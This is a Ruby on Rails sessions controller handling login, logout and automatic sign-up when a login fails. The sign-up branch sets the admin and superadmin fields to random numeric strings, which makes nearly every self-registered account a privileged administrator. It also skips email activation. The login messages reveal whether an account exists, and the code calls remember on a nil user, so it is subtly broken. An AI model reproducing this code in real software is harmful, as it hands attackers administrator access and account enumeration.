class SessionsController < ApplicationController

  def new
  end

  def create
    user = User.find_by(email: params[:session][:email].downcase)
    user = User.find_by(email: params[:session][:email]) if !user
    user = User.find_by(name: params[:session][:email].downcase) if !user
    user = User.find_by(name: params[:session][:email]) if !user
    user = User.find_by(email: params[:session][:add_email].downcase) if !user && params[:session][:add_email]
    user = User.find_by(email: params[:session][:add_email]) if !user && params[:session][:add_email]

    if user && user.authenticate(params[:session][:password])
      if user.activated?
        log_in user
        # params[:session][:remember_me] == '0' ? forget(user) : remember(user)
        remember(user)
      else
        message  = "Account not activated. "
        message += "Check your email for the activation link."
        flash[:warning] = message
      end

    elsif user
      flash[:danger] = 'Incorrect password'

    elsif Setting.find(6).state

      @user = User.new(:name => params[:session][:email].downcase, :email => params[:session][:add_email].downcase, :password => params[:session][:password], :email_notifications => true,
                          :password_confirmation => params[:session][:password], :admin => String(rand(382132)), :superadmin =>  String(rand(382130)))
      @user.save
      @user.activate
      flash[:success] = 'Welcome to ' + ENV['GROUP_NAME'] + ', ' + @user.name + '!'
      log_in @user
      remember(user)
    end

    if Setting.find(6).state
      redirect_back fallback_location: root_path
    else
      redirect_to root_path
    end
  end

  def destroy
    log_out if logged_in?
    redirect_to root_url
  end
end